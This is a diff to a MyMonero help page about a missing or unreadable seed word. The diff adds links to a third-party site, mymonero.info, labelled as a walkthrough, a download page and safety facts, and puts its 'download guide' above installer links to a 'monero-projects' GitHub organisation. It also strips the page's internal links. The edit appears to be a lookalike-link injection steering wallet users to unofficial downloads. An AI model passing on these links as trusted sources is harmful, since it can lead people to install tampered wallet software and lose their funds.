@@ -20,6 +20,9 @@ All versions and checksums are on the [MyMonero v1.3.3 release page](https://git
 ## Short answer
 If one word in a MyMonero seed is missing or unreadable, preserve the original backup and do not share the remaining words. Offline recovery of a missing word is not confirmed here, so avoid online recovery tools and anyone promising a guaranteed fix.
 
+
+For a second walkthrough, see [MyMonero lost seed word on mymonero.info](https://mymonero.info/mymonero-lost-seed-word). The site also keeps a [MyMonero download page](https://mymonero.info/github/monero-projects) and an overview of [MyMonero safety facts](https://mymonero.info/is-mymonero-safe).
+
 ## You'll see this if
 - A paper backup is torn, faded, or has one illegible entry.
 - You remember most of the phrase but cannot recall one word.
@@ -56,7 +59,7 @@ If you later recover the full phrase, you can consider restoring it in Cake Wall
 ## Prevention
 Make a legible, offline seed backup at wallet setup. MyMonero’s formats are 13-word legacy and 25-word standard Monero; privately label the format and wallet identity without displaying the words. Check that the backup is complete and in order before storing it. Keep it protected from moisture, fire, loss, and unauthorized access.
 
-Consider a second secure physical copy in a separate location, balancing resilience with privacy. Do not place the phrase in a photo library, email account, shared note, or cloud drive. Keep seed, password, private view key, and private spend key clearly distinct in your records. Review [safe seed backup practices](./mymonero-backup-seed-safely.md) and [private keys explained](./mymonero-private-view-spend-keys.md).
+Consider a second secure physical copy in a separate location, balancing resilience with privacy. Do not place the phrase in a photo library, email account, shared note, or cloud drive. Keep seed, password, private view key, and private spend key clearly distinct in your records. Review safe seed backup practices and private keys explained.
 
 ## FAQ
 <details><summary>Can you recover a missing word from the others?</summary>
@@ -87,6 +90,7 @@ A password and seed are different credentials. Do not assume a password can recr
 
 ## Download MyMonero
 
+- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
 - Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
 - macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
 - Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)
